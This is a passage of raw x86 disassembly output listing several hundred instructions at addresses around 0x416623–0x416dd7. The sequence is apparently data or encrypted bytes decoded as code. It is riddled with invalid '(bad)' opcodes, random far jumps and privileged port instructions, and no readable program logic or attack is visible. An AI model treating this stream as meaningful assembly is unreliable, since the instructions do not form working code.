  416623:	and    DWORD PTR [ebp+ebx*8+0x6d77e415],ecx
  41662a:	xor    DWORD PTR [esi-0x48],ebx
  41662d:	imul   edi,edx,0x5d41bf69
  416633:	pop    ds
  416634:	in     eax,0x31
  416636:	mov    ebx,0x38ed73fd
  41663b:	mov    al,ds:0x96b86094
  416640:	xor    ebx,esi
  416642:	sub    al,0x5d
  416644:	pop    ecx
  416645:	leave  
  416646:	mov    esi,0xd91ed801
  41664b:	call   0xd21d:0x8be8bfed
  416652:	fwait
  416653:	and    DWORD PTR [ebp+esi*8-0x5f70da6f],ebx
  41665a:	pop    es
  41665b:	outs   dx,DWORD PTR ds:[esi]
  41665c:	data16 jg 0x41668b
  41665f:	cli    
  416660:	lock inc ecx
  416662:	iret   
  416663:	cdq    
  416664:	add    edx,DWORD PTR [ebx]
  416666:	push   0xffffff9b
  416668:	inc    edi
  416669:	pusha  
  41666a:	or     eax,0x19a6f8d2
  41666f:	jnp    0x4166d1
  416671:	or     eax,0x24144d1b
  416676:	xor    al,0x16
  416678:	into   
  416679:	fsub   st,st(5)
  41667b:	or     BYTE PTR [ebp+0x60],cl
  41667e:	sahf   
  41667f:	xchg   bl,cl
  416681:	jbe    0x416610
  416683:	call   0x192f:0xb9c02aa4
  41668a:	popa   
  41668b:	data16 or al,0x75
  41668e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41668f:	push   eax
  416690:	xchg   ebp,eax
  416691:	cwde   
  416692:	pop    ecx
  416693:	adc    bl,al
  416695:	mov    edx,0x479332ec
  41669a:	add    edi,eax
  41669c:	mov    esp,0x42b1768e
  4166a1:	xor    DWORD PTR [ebp+0x6e8b802f],ebx
  4166a7:	cdq    
  4166a8:	and    BYTE PTR [ebx+0x6c],bh
  4166ab:	or     DWORD PTR [edi+0x72],eax
  4166ae:	xlat   BYTE PTR ds:[ebx]
  4166af:	push   cs
  4166b0:	cmp    al,0x7d
  4166b2:	or     edx,DWORD PTR [ebp-0x40727e2d]
  4166b8:	outs   dx,BYTE PTR ds:[esi]
  4166b9:	test   DWORD PTR [esi+0x3e],ecx
  4166bc:	aad    0xe4
  4166be:	dec    esi
  4166bf:	mov    dl,BYTE PTR [edi]
  4166c1:	mov    dh,0x85
  4166c3:	mov    DWORD PTR [edx+0x6522cbb],0xcfee8f0
  4166cd:	bound  ebp,QWORD PTR [ecx-0x38719c94]
  4166d3:	pop    esp
  4166d4:	dec    edi
  4166d5:	rcr    BYTE PTR ss:[eax+0x34197dec],0xe5
  4166dd:	or     BYTE PTR [ecx],bl
  4166df:	mov    ah,0x23
  4166e1:	and    al,0x68
  4166e3:	sbb    eax,0x2635af3d
  4166e8:	fsub   st,st(1)
  4166ea:	xchg   esp,eax
  4166eb:	xor    DWORD PTR [edi-0x11],0x851634ae
  4166f2:	mov    al,0x92
  4166f4:	arpl   bp,sp
  4166f6:	fbld   TBYTE PTR [eax-0x53]
  4166f9:	cmp    bl,ah
  4166fb:	cli    
  4166fc:	pop    ecx
  4166fd:	(bad)  
  4166fe:	cmp    eax,0x1c175c8d
  416703:	xor    ecx,DWORD PTR [ecx]
  416705:	sbb    eax,0xff471fbb
  41670a:	mov    esp,0xa216ac07
  41670f:	ror    BYTE PTR [eax],0xd5
  416712:	mov    bl,BYTE PTR [esi]
  416714:	fnstcw WORD PTR [edx-0x55]
  416717:	or     dh,0xd3
  41671a:	cmp    DWORD PTR [ebp+ebp*2-0x14e23d79],ebx
  416721:	adc    al,0x34
  416723:	fadd   QWORD PTR [ebp+0x4d]
  416726:	rcr    BYTE PTR [ebp+ecx*4+0x44],1
  41672a:	std    
  41672b:	inc    edi
  41672c:	jo     0x416790
  41672e:	xor    DWORD PTR [ebp+ebx*8+0x6a810459],ebx
  416735:	out    dx,al
  416736:	xchg   edi,eax
  416737:	sti    
  416738:	xchg   BYTE PTR [edx-0x5d],bh
  41673b:	adc    cl,BYTE PTR [edx]
  41673d:	leave  
  41673e:	shr    BYTE PTR [esi+0x14aaa837],1
  416744:	push   ss
  416745:	and    cl,BYTE PTR [eax-0x2177fa65]
  41674b:	add    DWORD PTR [ecx-0x43680ad1],ecx
  416751:	and    al,0xc2
  416753:	pushf  
  416754:	je     0x41673e
  416756:	jmp    0x33c1:0x838e8dcb
  41675d:	vfrczpd ymm4,YMMWORD PTR [eax]
  416762:	or     DWORD PTR [eax+0x3],edx
  416765:	push   DWORD PTR [esi+0x62]
  416768:	adc    edx,DWORD PTR [ebx]
  41676a:	sub    BYTE PTR [esi+0x60463993],cl
  416770:	cmp    al,0x18
  416772:	test   cl,0x94
  416775:	sar    bh,0xd1
  416778:	pop    ecx
  416779:	xchg   esi,eax
  41677a:	dec    esi
  41677b:	push   esi
  41677c:	push   cs
  41677d:	mov    al,ds:0x3acc621b
  416782:	push   esi
  416783:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416784:	sbb    al,0xc7
  416786:	jge    0x416747
  416788:	mov    eax,ds:0x75bead3e
  41678d:	into   
  41678e:	jbe    0x416761
  416790:	pxor   mm3,QWORD PTR [ecx-0x6ca74407]
  416797:	xchg   DWORD PTR [edi+0x4],ecx
  41679a:	mov    cl,0x18
  41679c:	sbb    edi,ebx
  41679e:	push   ss
  41679f:	dec    esp
  4167a0:	(bad)  
  4167a1:	fidivr WORD PTR [ebx]
  4167a3:	aas    
  4167a4:	(bad)  
  4167a5:	xor    ebx,DWORD PTR [ebp-0x73]
  4167a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167a9:	add    dl,dh
  4167ab:	outs   dx,BYTE PTR ds:[esi]
  4167ac:	pop    ebx
  4167ad:	pop    ecx
  4167ae:	hlt    
  4167af:	jbe    0x4167fd
  4167b1:	jmp    0x9330:0xa3d5003
  4167b8:	push   esp
  4167b9:	and    bl,BYTE PTR [edx-0x769a7da9]
  4167bf:	pop    ebp
  4167c0:	push   ebx
  4167c1:	dec    esi
  4167c2:	cli    
  4167c3:	mov    ch,0xcd
  4167c5:	fs inc ecx
  4167c7:	(bad)  
  4167c9:	xor    al,0x8f
  4167cb:	nop
  4167cc:	enter  0xb6c5,0x66
  4167d0:	jl     0x4167c5
  4167d2:	jmp    0x41676b
  4167d4:	call   0x4642:0xeb00f04a
  4167db:	and    bh,cl
  4167dd:	xor    al,0xa7
  4167df:	xchg   DWORD PTR [esi+eax*1+0x77bd1974],ebx
  4167e6:	sar    BYTE PTR [ecx],cl
  4167e8:	lds    esi,FWORD PTR ds:0x245d0560
  4167ee:	clc    
  4167ef:	mov    ds:0xae708457,eax
  4167f4:	or     dl,BYTE PTR [edx-0x26d8d08b]
  4167fa:	mov    ah,0xed
  4167fc:	out    0x66,eax
  4167fe:	push   0x2d
  416800:	jnp    0x4167b2
  416802:	icebp  
  416803:	xor    eax,edi
  416805:	sbb    al,0xda
  416807:	inc    esi
  416808:	sbb    eax,0xefe69fbc
  41680d:	sbb    edi,ebp
  41680f:	js     0x416806
  416811:	ret    0xaf58
  416814:	cs pop ss
  416816:	daa    
  416817:	inc    ebx
  416818:	jge    0x416864
  41681a:	or     BYTE PTR [edi-0x46],dl
  41681d:	out    dx,eax
  41681e:	push   cs
  41681f:	aam    0x95
  416821:	cs mov edi,0x8b50d0b1
  416827:	push   ebx
  416828:	loope  0x4167b2
  41682a:	std    
  41682b:	pop    esp
  41682c:	cmp    DWORD PTR [ecx],edi
  41682e:	arpl   WORD PTR [eax+0x13],cx
  416831:	fs or  al,0x33
  416834:	add    dh,BYTE PTR [ebx+0x30]
  416837:	dec    ebx
  416838:	in     al,dx
  416839:	aas    
  41683a:	out    0xa,al
  41683c:	pop    esp
  41683d:	fistp  QWORD PTR [esi]
  41683f:	pop    esi
  416840:	ror    DWORD PTR [edi-0x13afe6c4],cl
  416846:	je     0x41684f
  416848:	sub    eax,0x77d1ab99
  41684d:	test   eax,0x1f959ff5
  416852:	mov    ebp,esp
  416854:	mov    bl,ah
  416856:	mul    DWORD PTR [ebx]
  416858:	push   esi
  416859:	xchg   esp,eax
  41685a:	and    DWORD PTR [edx],ebp
  41685c:	js     0x41684e
  41685e:	dec    eax
  41685f:	add    ebp,DWORD PTR [ebx]
  416861:	adc    DWORD PTR [ebp+0x5784dfe2],esp
  416867:	ds and al,0x6b
  41686a:	jmp    0xbab9:0xba2c5ae4
  416871:	or     al,0xb4
  416873:	mov    dl,0x7e
  416875:	jbe    0x4168a0
  416877:	cli    
  416878:	mul    BYTE PTR [edx+edi*8]
  41687b:	enter  0x22c,0x21
  41687f:	idiv   DWORD PTR [edx+0xbae8103]
  416885:	bound  ebp,QWORD PTR [edi+0x604fffad]
  41688b:	aas    
  41688c:	vpunpcklbw xmm4,xmm3,XMMWORD PTR [edi-0x41e27ba2]
  416894:	pop    ds
  416895:	dec    edi
  416896:	shl    BYTE PTR [esi],1
  416898:	adc    al,0xc8
  41689a:	jle    0x41687e
  41689c:	xchg   ebx,eax
  41689d:	and    DWORD PTR [ebx-0x21],edi
  4168a0:	add    DWORD PTR [eax-0x71],ebx
  4168a3:	fdiv   st,st(6)
  4168a5:	popf   
  4168a6:	pop    esi
  4168a7:	mov    esi,0x20049bdb
  4168ac:	inc    ebx
  4168ad:	fsub   QWORD PTR [ecx+0x1c]
  4168b0:	pop    ebp
  4168b1:	(bad)  
  4168b2:	mov    ds:0x2104d079,eax
  4168b7:	mov    al,ds:0xfb8ddfcb
  4168bc:	mov    eax,0x49095b76
  4168c1:	(bad)  
  4168c2:	xchg   ecx,eax
  4168c3:	js     0x41691f
  4168c5:	xchg   ebp,eax
  4168c6:	fs or  al,0x1
  4168c9:	(bad)  
  4168ca:	cli    
  4168cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168cc:	dec    eax
  4168cd:	pop    ss
  4168ce:	lds    edi,FWORD PTR [edx]
  4168d0:	icebp  
  4168d1:	and    al,0x4c
  4168d3:	xchg   esi,eax
  4168d4:	in     al,dx
  4168d5:	add    ah,BYTE PTR [eax]
  4168d7:	repz xchg ecx,eax
  4168d9:	inc    BYTE PTR [edx]
  4168db:	scas   al,BYTE PTR es:[edi]
  4168dc:	in     al,dx
  4168dd:	call   0x3bf2:0x2772b7e4
  4168e4:	test   BYTE PTR [ebx],ah
  4168e6:	push   esi
  4168e7:	push   ss
  4168e8:	dec    ebp
  4168e9:	or     BYTE PTR [ecx+0x7d01a459],al
  4168ef:	dec    eax
  4168f0:	repz scas eax,DWORD PTR es:[edi]
  4168f2:	dec    edi
  4168f3:	test   cl,dl
  4168f5:	adc    BYTE PTR [esi*4+0x4838cb1c],bl
  4168fc:	pusha  
  4168fd:	ret    0x41b7
  416900:	fcmovu st,st(6)
  416902:	pop    ecx
  416903:	jle    0x416970
  416905:	jbe    0x4168ba
  416907:	mov    ds:0xb8937cb7,eax
  41690c:	enter  0x10c2,0xd3
  416910:	dec    ecx
  416911:	lods   al,BYTE PTR ds:[esi]
  416912:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416913:	dec    ebx
  416914:	std    
  416915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416916:	mov    ah,0x9f
  416918:	repnz cmp eax,0x37960430
  41691e:	add    ah,BYTE PTR [edx+0x30]
  416921:	dec    ebx
  416922:	cmc    
  416923:	dec    ebp
  416924:	mov    edx,0x83f12399
  416929:	std    
  41692a:	mov    dl,0x25
  41692c:	mov    DWORD PTR [ebx+0x257d336f],ebp
  416932:	or     dh,0x7b
  416935:	daa    
  416936:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416937:	in     al,dx
  416938:	xor    BYTE PTR [eax+0x36],0xd2
  41693c:	mov    al,0xf4
  41693e:	mov    dl,0x1c
  416940:	cmp    bh,BYTE PTR [ebp+0xb892202]
  416946:	mov    al,0x6c
  416948:	add    al,0x23
  41694a:	sbb    al,0x5f
  41694c:	std    
  41694d:	(bad)  
  41694e:	(bad)
  416953:	lea    esp,[edx-0x24da1a8]
  416959:	dec    esi
  41695a:	dec    ebx
  41695b:	cmp    bh,BYTE PTR ds:0xeca0396f
  416961:	(bad)  
  416962:	cmp    DWORD PTR ds:0x215dec6e,esp
  416968:	add    DWORD PTR [edi+ebx*2-0x2614a365],0x11ca5b90
  416973:	inc    ebx
  416974:	mov    al,ds:0x1ce54065
  416979:	jmp    0x416963
  41697b:	push   ds
  41697c:	dec    edi
  41697d:	out    dx,al
  41697e:	nop
  41697f:	ret    
  416980:	jb     0x4169df
  416982:	mov    ds:0x96054f3b,eax
  416987:	and    dl,BYTE PTR [ebp-0x531a76c6]
  41698d:	(bad)  
  41698e:	loop   0x41693b
  416990:	pop    ecx
  416991:	cmp    eax,DWORD PTR [ecx+0x2a5cf210]
  416997:	and    DWORD PTR cs:[esi-0x7bba4a45],ecx
  41699e:	xchg   ecx,eax
  41699f:	dec    bp
  4169a1:	in     eax,dx
  4169a2:	inc    esp
  4169a3:	je     0x416987
  4169a5:	rcl    cl,1
  4169a7:	sbb    BYTE PTR [edi],cl
  4169a9:	cwde   
  4169aa:	sbb    al,BYTE PTR [esi+ebp*2-0x62]
  4169ae:	out    dx,al
  4169af:	mov    eax,ds:0x55d0328
  4169b4:	(bad)  
  4169b5:	pusha  
  4169b6:	or     BYTE PTR [edx],bh
  4169b8:	pop    ebx
  4169b9:	out    dx,al
  4169ba:	pop    edx
  4169bb:	pop    esp
  4169bc:	mov    dh,0x4
  4169be:	jns    0x4169a5
  4169c0:	jle    0x4169d3
  4169c2:	lds    esi,FWORD PTR [esi-0x31]
  4169c5:	das    
  4169c6:	sahf   
  4169c7:	jae    0x41699d
  4169c9:	test   al,0x68
  4169cb:	jbe    0x4169cd
  4169cd:	cli    
  4169ce:	scas   al,BYTE PTR es:[edi]
  4169cf:	cmc    
  4169d0:	loop   0x416a15
  4169d2:	and    eax,0x46ccfb8c
  4169d7:	xor    bh,bh
  4169d9:	pusha  
  4169da:	inc    edi
  4169db:	push   0x9b01a7af
  4169e0:	inc    esp
  4169e1:	mov    cl,0x3b
  4169e3:	(bad)  
  4169e5:	or     bh,ch
  4169e7:	imul   ecx,DWORD PTR [ebp+0x4e],0x467c7a46
  4169ee:	inc    esp
  4169ef:	xor    eax,0x5c9cb26b
  4169f4:	pushf  
  4169f5:	dec    esp
  4169f6:	xchg   ecx,eax
  4169f7:	pop    ebp
  4169f8:	rcl    DWORD PTR [edx-0x49],0x6f
  4169fc:	clc    
  4169fd:	jb     0x416a6b
  4169ff:	xor    esp,DWORD PTR [ebx+0x5e]
  416a02:	xchg   esi,eax
  416a03:	(bad)  
  416a05:	and    al,0x9a
  416a07:	ins    DWORD PTR es:[edi],dx
  416a08:	test   edi,esi
  416a0a:	jp     0x4169fe
  416a0c:	fcomi  st,st(2)
  416a0e:	mov    esp,0xd276143f
  416a13:	js     0x416a7f
  416a15:	dec    ecx
  416a16:	sahf   
  416a17:	push   ss
  416a18:	pop    ebx
  416a19:	or     DWORD PTR [ecx],edx
  416a1b:	sbb    edi,DWORD PTR cs:[ecx+0x5a]
  416a1f:	pop    ecx
  416a20:	js     0x416a9f
  416a22:	das    
  416a23:	dec    ecx
  416a24:	cmp    BYTE PTR [ebp+0x35],0xe2
  416a28:	int3   
  416a29:	aaa    
  416a2a:	popf   
  416a2b:	cmc    
  416a2c:	test   BYTE PTR [esi+0x7c],0x95
  416a30:	mov    ds:0x6402b9e4,eax
  416a35:	and    dh,BYTE PTR [ebx-0x27a8073d]
  416a3b:	test   edx,0xc0046c86
  416a41:	xlat   BYTE PTR ds:[ebx]
  416a42:	test   eax,0xc4713a1b
  416a47:	dec    esp
  416a48:	jl     0x4169fd
  416a4a:	and    DWORD PTR [ebx-0xc08aee4],ebp
  416a50:	js     0x416a43
  416a52:	fwait
  416a53:	lea    edx,[ebp+0x6e4ca05b]
  416a59:	mov    gs,WORD PTR ds:0x3ac01ef
  416a5f:	and    BYTE PTR [ebx-0x11],bl
  416a62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a63:	ror    bh,cl
  416a65:	pop    esp
  416a66:	in     al,0xad
  416a68:	int    0x8d
  416a6a:	dec    esi
  416a6b:	sbb    esp,DWORD PTR [edx]
  416a6d:	mov    ebx,DWORD PTR [ecx+0x5eeaad8]
  416a73:	(bad)  
  416a74:	aam    0x3e
  416a76:	sti    
  416a77:	inc    esp
  416a78:	test   BYTE PTR es:[ecx+0x4c],bh
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	(bad)  
  416a7e:	in     al,0xb8
  416a80:	mov    ebp,0x72eecd83
  416a85:	test   DWORD PTR [ebp+0x60],ecx
  416a88:	out    dx,al
  416a89:	test   ecx,esp
  416a8b:	pop    esp
  416a8c:	out    dx,al
  416a8d:	inc    esp
  416a8e:	mov    ds:0x55c04509,eax
  416a93:	mov    bp,0xe708
  416a97:	dec    edi
  416a98:	mov    ebp,0x1b0e3fd8
  416a9d:	jl     0x416ab6
  416a9f:	ins    DWORD PTR es:[edi],dx
  416aa0:	ret    
  416aa1:	ret    
  416aa2:	in     eax,dx
  416aa3:	icebp  
  416aa4:	or     BYTE PTR [edx],dh
  416aa6:	or     bh,BYTE PTR [edx-0x347958e7]
  416aac:	lea    edi,[edi]
  416aae:	adc    al,dl
  416ab0:	in     eax,0x64
  416ab2:	mov    esi,0xf09c78b6
  416ab7:	jecxz  0x416b37
  416ab9:	jecxz  0x416b33
  416abb:	jbe    0x416a8a
  416abd:	fdivr  DWORD PTR ss:[edi-0x1eb5902c]
  416ac4:	sbb    ah,ah
  416ac6:	jecxz  0x416a4b
  416ac8:	bound  ebp,QWORD PTR [edi-0x75b5039d]
  416ace:	cmp    al,BYTE PTR [edi]
  416ad0:	ds pop ds
  416ad2:	jmp    0x416a99
  416ad4:	lods   eax,DWORD PTR ds:[esi]
  416ad5:	add    edi,esp
  416ad7:	or     edx,esp
  416ad9:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416adb:	push   edi
  416adc:	push   esi
  416add:	sahf   
  416ade:	dec    ecx
  416adf:	add    DWORD PTR [ecx+0x6c45a015],esi
  416ae5:	cmp    al,0x4e
  416ae7:	fcmove st,st(5)
  416ae9:	jns    0x416a7f
  416aeb:	sahf   
  416aec:	leave  
  416aed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416aee:	out    0x84,al
  416af0:	cmp    DWORD PTR [ebx],0x74
  416af3:	dec    edi
  416af4:	(bad)  
  416af5:	or     eax,0xb0410328
  416afa:	xor    eax,0x50b3eed5
  416aff:	(bad)  
  416b00:	push   ebp
  416b01:	sbb    al,0xd6
  416b03:	or     al,al
  416b05:	jp     0x416a89
  416b07:	inc    edi
  416b08:	addr16 popf 
  416b0a:	shl    esp,1
  416b0c:	xchg   edi,eax
  416b0d:	or     bh,dh
  416b0f:	fld    TBYTE PTR [ecx-0x73]
  416b12:	xor    BYTE PTR [edi-0x6b],ch
  416b15:	inc    BYTE PTR [ecx+0x2ff08270]
  416b1b:	loopne 0x416b1d
  416b1d:	or     eax,ebx
  416b1f:	mov    bl,0x5f
  416b21:	ss dec ecx
  416b23:	pop    ecx
  416b24:	pop    eax
  416b25:	pusha  
  416b26:	jns    0x416b26
  416b28:	es pop es
  416b2a:	pop    eax
  416b2b:	inc    DWORD PTR [edx+0x1d]
  416b2e:	iret   
  416b2f:	neg    bh
  416b31:	cmc    
  416b32:	xor    bl,ch
  416b34:	adc    BYTE PTR [ecx+0x4e],ch
  416b37:	mov    esp,0x35f94df5
  416b3c:	mov    bl,0x87
  416b3e:	imul   eax,DWORD PTR [eax],0x1c
  416b41:	ins    DWORD PTR es:[edi],dx
  416b42:	xor    al,0xef
  416b44:	jecxz  0x416aef
  416b46:	repnz icebp 
  416b48:	adc    esp,DWORD PTR [ebp+0x267646d7]
  416b4e:	out    dx,al
  416b4f:	outs   dx,DWORD PTR ds:[esi]
  416b50:	jle    0x416bac
  416b52:	xchg   cl,ah
  416b54:	cmp    eax,0x6c619cc0
  416b59:	sbb    al,0x7f
  416b5b:	push   eax
  416b5c:	gs xchg ecx,eax
  416b5e:	hlt    
  416b5f:	int    0x3a
  416b61:	(bad)  
  416b63:	sbb    DWORD PTR [edx],edx
  416b65:	rol    BYTE PTR [eax-0x7f],1
  416b68:	shl    edi,1
  416b6a:	jo     0x416b8f
  416b6c:	jae    0x416bb6
  416b6e:	xchg   DWORD PTR cs:[edx+0x53],edi
  416b72:	xor    BYTE PTR [esi+0x3062d4a9],0x81
  416b79:	std    
  416b7a:	sbb    ebx,DWORD PTR [edi]
  416b7c:	fxch   st(7)
  416b7e:	mov    ch,0xe0
  416b80:	cs mov edi,0x1c391e04
  416b86:	sar    bh,1
  416b88:	ins    DWORD PTR es:[edi],dx
  416b89:	in     al,0xec
  416b8b:	jl     0x416bef
  416b8d:	pop    ecx
  416b8e:	cmp    al,0x50
  416b90:	pop    ss
  416b91:	(bad)  
  416b92:	ja     0x416bf0
  416b94:	into   
  416b95:	jnp    0x416b20
  416b97:	bound  ecx,QWORD PTR [edx]
  416b99:	(bad)  
  416b9a:	cmp    DWORD PTR cs:[edi+0x5b76e68a],eax
  416ba1:	sahf   
  416ba2:	leave  
  416ba3:	xchg   edi,eax
  416ba4:	(bad)  
  416ba5:	mov    eax,0x91aeab66
  416baa:	sub    DWORD PTR ds:0x60c3ec89,esi
  416bb0:	xor    DWORD PTR [edx-0x7f],edx
  416bb3:	xor    DWORD PTR [esi],ecx
  416bb5:	in     eax,0xbc
  416bb7:	mov    esi,0x96f2904c
  416bbc:	das    
  416bbd:	pop    esp
  416bbe:	popf   
  416bbf:	ficomp WORD PTR [edi]
  416bc1:	and    eax,DWORD PTR [ebp-0x43]
  416bc4:	ja     0x416c03
  416bc6:	fistp  WORD PTR [ecx-0x23]
  416bc9:	out    dx,eax
  416bca:	or     DWORD PTR [edx],edi
  416bcc:	lods   al,BYTE PTR ds:[esi]
  416bcd:	xor    DWORD PTR [ebp-0x50],eax
  416bd0:	sub    eax,0xcbc6f40f
  416bd5:	loop   0x416bdb
  416bd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bd8:	mov    bh,0x0
  416bda:	mov    BYTE PTR [edx],ah
  416bdc:	push   edi
  416bdd:	icebp  
  416bde:	inc    ecx
  416bdf:	mov    edx,0xf9c27701
  416be4:	repz int3 
  416be6:	je     0x416bdc
  416be8:	imul   eax,DWORD PTR [edi-0x28],0xb2a23f82
  416bef:	sti    
  416bf0:	sbb    ebx,edi
  416bf2:	in     eax,0xfe
  416bf4:	push   ecx
  416bf5:	mov    ch,0xaf
  416bf7:	rol    DWORD PTR ds:0xdbf69e5d,1
  416bfd:	xor    BYTE PTR [ebx-0x3a6f784d],bh
  416c03:	inc    edx
  416c04:	xchg   edx,eax
  416c05:	fistp  DWORD PTR [ecx-0x4c]
  416c08:	lahf   
  416c09:	jno    0x416bf2
  416c0b:	pop    edx
  416c0c:	mov    ?,WORD PTR [esp+ebp*8-0x3e9618ec]
  416c13:	jle    0x416bf1
  416c15:	add    BYTE PTR [ebx-0x19],cl
  416c18:	push   ebx
  416c19:	sub    eax,0x2a106162
  416c1e:	aaa    
  416c1f:	ins    DWORD PTR es:[edi],dx
  416c20:	(bad)  
  416c21:	es fwait
  416c23:	idiv   edx
  416c25:	stos   BYTE PTR es:[edi],al
  416c26:	mov    eax,0x95cf332f
  416c2b:	or     edx,DWORD PTR [esi]
  416c2d:	aaa    
  416c2e:	jne    0x416c59
  416c30:	inc    ebx
  416c31:	push   ds
  416c32:	imul   ebp,DWORD PTR [ecx],0x5d57690d
  416c38:	retf   
  416c39:	jmp    0x68a45a64
  416c3e:	mov    bh,0x47
  416c40:	jmp    0x416c6b
  416c42:	sbb    BYTE PTR [ebp-0x18],0x11
  416c46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c47:	cmp    al,BYTE PTR [edx+0x1514720e]
  416c4d:	shl    esi,0xff
  416c50:	ja     0x416cc6
  416c52:	in     al,dx
  416c53:	sub    edx,DWORD PTR [eax+0x47]
  416c56:	je     0x416c23
  416c58:	xor    BYTE PTR [edi+0x263957bc],ch
  416c5e:	jbe    0x416cb1
  416c60:	or     bh,BYTE PTR [edi+ecx*4-0x1de9bb0]
  416c67:	push   eax
  416c68:	pop    ecx
  416c69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c6a:	and    ecx,edx
  416c6c:	repz push edx
  416c6e:	mov    bh,0xb9
  416c70:	xor    ch,al
  416c72:	shr    BYTE PTR [edx],1
  416c74:	xchg   di,ax
  416c76:	enter  0x3156,0x5e
  416c7a:	add    al,0xba
  416c7c:	dec    edi
  416c7d:	xor    DWORD PTR [ebp+0x7a8366cd],ecx
  416c83:	fcmovnbe st,st(0)
  416c85:	ja     0x416ce6
  416c87:	retf   
  416c88:	bound  ebx,QWORD PTR [eax-0x64]
  416c8b:	mov    eax,0x3db4f053
  416c90:	sbb    DWORD PTR [esi-0x57c54176],ebx
  416c96:	mov    BYTE PTR [ebx],bh
  416c98:	xchg   ebp,edx
  416c9a:	mov    dl,dh
  416c9c:	cmp    ecx,DWORD PTR [ebx]
  416c9e:	cmp    al,0xd2
  416ca0:	and    eax,0x456a219f
  416ca5:	out    0xbe,eax
  416ca7:	mov    DWORD PTR es:[eax],ecx
  416caa:	test   BYTE PTR [ebx+0xf34566a],al
  416cb0:	call   0xde98:0xd5c0dc5
  416cb7:	fdivr  QWORD PTR [edi-0x4602141b]
  416cbd:	push   esi
  416cbe:	cmc    
  416cbf:	xchg   ecx,eax
  416cc0:	mov    cl,0x68
  416cc2:	jecxz  0x416d1d
  416cc4:	xlat   BYTE PTR ds:[ebx]
  416cc5:	lahf   
  416cc6:	mov    bh,0xc1
  416cc8:	mov    ax,ds:0xd0766a59
  416ccf:	cdq    
  416cd0:	jae    0x416c73
  416cd2:	or     eax,0x7d293c11
  416cd7:	ret    0xac6f
  416cda:	repnz sbb al,0x60
  416cdd:	clc    
  416cde:	mov    cl,BYTE PTR [esi]
  416ce0:	test   al,0x4a
  416ce2:	cmp    ah,BYTE PTR [edx+0x28]
  416ce5:	pop    ebp
  416ce6:	and    BYTE PTR [eax+0x6c2129ea],bh
  416cec:	test   al,0x39
  416cee:	inc    ebx
  416cef:	pop    ecx
  416cf0:	call   0xe8ec:0xd0e69230
  416cf7:	add    eax,0x85a44de1
  416cfc:	imul   DWORD PTR [edi]
  416cfe:	mov    ch,0x32
  416d00:	popa   
  416d01:	out    dx,eax
  416d02:	mov    al,0x84
  416d04:	pop    ebx
  416d05:	shl    DWORD PTR [edi+0x9],cl
  416d08:	dec    ecx
  416d09:	stc    
  416d0a:	xor    DWORD PTR [edx+0x22ad743b],ebp
  416d10:	xchg   esp,eax
  416d11:	(bad)  
  416d12:	mov    bl,0x56
  416d14:	hlt    
  416d15:	xchg   ebp,eax
  416d16:	mov    BYTE PTR [edx+0x2b935147],ch
  416d1c:	jl     0x416cb3
  416d1e:	sbb    al,0xbf
  416d20:	mov    al,0x84
  416d22:	imul   esp
  416d24:	cmp    esi,DWORD PTR ds:0x5e389d37
  416d2a:	jns    0x416d6f
  416d2c:	dec    esp
  416d2d:	fnstcw WORD PTR ds:0x9c0197da
  416d33:	or     DWORD PTR [eax+0x661efa63],esp
  416d39:	mov    ch,BYTE PTR [edx-0x7c]
  416d3c:	out    0x0,al
  416d3e:	in     al,dx
  416d3f:	and    edx,DWORD PTR [si-0x12cc]
  416d44:	jl     0x416d75
  416d46:	cwde   
  416d47:	imul   eax,DWORD PTR [esi+0x49],0xffffff9d
  416d4b:	add    bh,BYTE PTR [ebp-0x76]
  416d4e:	jns    0x416cda
  416d50:	mov    bh,0xc3
  416d52:	ss jb  0x416cd5
  416d55:	stos   DWORD PTR es:[edi],eax
  416d56:	or     BYTE PTR gs:[ebp+0x6edf4094],0xca
  416d5e:	out    dx,al
  416d5f:	rcr    BYTE PTR [ebx],1
  416d61:	dec    eax
  416d62:	cmp    DWORD PTR [ecx+0x26],esi
  416d65:	fstp   st(4)
  416d67:	mov    cl,0xa7
  416d69:	shr    BYTE PTR ds:0x41a04e2e,cl
  416d6f:	or     dl,BYTE PTR [ebx+0xa]
  416d72:	(bad)  [ebx-0x3ee9cf75]
  416d78:	adc    al,0xf4
  416d7a:	imul   esp,DWORD PTR [edi+0x9],0x8f4a3dd1
  416d81:	into   
  416d82:	out    0x59,eax
  416d84:	mov    ss,WORD PTR [edx+esi*2-0x13]
  416d88:	pop    ebx
  416d89:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d8b:	ins    BYTE PTR es:[edi],dx
  416d8c:	enter  0xdcd3,0x84
  416d90:	(bad)  
  416d91:	jns    0x416d5a
  416d93:	jmp    0xf34e:0x3631a21f
  416d9a:	out    0x69,al
  416d9c:	inc    esi
  416d9d:	pop    ecx
  416d9e:	sbb    DWORD PTR [esi],0x2f2c8171
  416da4:	jb     0x416d8d
  416da6:	and    BYTE PTR [edx],bl
  416da8:	test   eax,0xefeb31d4
  416dad:	and    eax,0x8f6673e0
  416db2:	jg     0x416da5
  416db4:	jmp    0x1e6a:0x7ed49fb4
  416dbb:	ror    DWORD PTR [eax-0x11],0x11
  416dbf:	cwde   
  416dc0:	(bad)  
  416dc1:	jns    0x416dd2
  416dc3:	jecxz  0x416e2d
  416dc5:	mov    esi,0x691aa7b
  416dca:	xlat   BYTE PTR ds:[ebx]
  416dcb:	test   DWORD PTR [esp+ebp*8],edx
  416dce:	sbb    ch,BYTE PTR [edi+0x62d638d2]
  416dd4:	ins    BYTE PTR es:[edi],dx
  416dd5:	cld    
  416dd6:	in     al,dx
  416dd7:	sar    DWORD PTR [eax-0x74bdee3f],cl
